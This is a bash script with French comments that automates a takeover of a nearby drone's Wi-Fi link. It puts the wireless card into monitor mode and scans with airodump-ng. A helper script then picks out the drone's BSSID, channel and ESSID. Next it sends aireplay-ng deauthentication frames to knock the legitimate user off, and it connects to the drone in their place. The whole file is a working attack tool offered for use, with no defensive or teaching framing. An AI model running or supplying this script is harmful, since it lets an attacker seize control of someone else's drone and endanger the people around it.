#!/bin/bash

#Met en mode "managed" la carte reseau souhaitee
function setManaged {
	INTER=$1
	ifconfig $INTER down
	iwconfig $INTER mode managed
	ifconfig $INTER up
}

#Met en mode "monitor" la carte reseau souhaitee
function setMonitor {
	INTER=$1
	ifconfig $INTER down
	iwconfig $INTER mode monitor
	ifconfig $INTER up
}

#Cette fonction trouve le BSSID, la chaine ainsi que l'ESSID, necessaires pour lancer l'attaque
function analyse {
	INTER=$1

	#On configure notre interface monitor
	airmon-ng check kill
	setMonitor $INTER

	echo "PERFORMING AUTOMATIC DETECTION"
	#On écoute tout le traffic autour de nous
	xterm -geometry "130x35" -e "airodump-ng -w temp --output-format csv $INTER" & PID=$!

	sleep 7
	kill -SIGINT $PID

	FILENAME='temp-01.csv'

	#On l'analyse avec le programme python
	./find_drone.py $FILENAME > temp.txt

	BSSID="$(head -1 temp.txt)"
	CHL="$(tail -n+2 temp.txt | head -1)"
	ESSID="$(tail -n+3 temp.txt | head -1)"

	rm $FILENAME
	rm temp.txt
}

#Deconnecte l'utilisateur connecte au drone puis se connecte a sa place
function attack {
	INTER=$1
	CHL=$2
	BSSID=$3

	#Attaque !!!
	echo "DISCONNECTING THE USER..."
	iwconfig $INTER channel $CHL 
	aireplay-ng -0 5 -a $BSSID $INTER

	#On se connecte au drone
	echo "CONNECTING TO THE DRONE..."
	setManaged $INTER
	iwconfig $INTER essid $ESSID ap $BSSID
	dhclient -v $INTER

	echo "OK! YOU ARE NOW CONNECTED TO THE DRONE!"
}

INTER=$(ip a | grep wlp | cut -d " " -f2 | head -c-2)
echo "Using interface $INTER"

analyse $INTER

if [ "$BSSID" == "" ] || [ "$CHL" == "" ] || [ "$ESSID" == "" ]; then
	echo "Ooops, no drone found !"
	setManaged $INTER
	exit 1

else
	echo "FOUND 1 DRONE : "
	echo "BSSID :"
	echo $BSSID
	echo "Channel :"
	echo $CHL
	echo "ESSID :"
	echo $ESSID

	attack $INTER $CHL $BSSID
fi
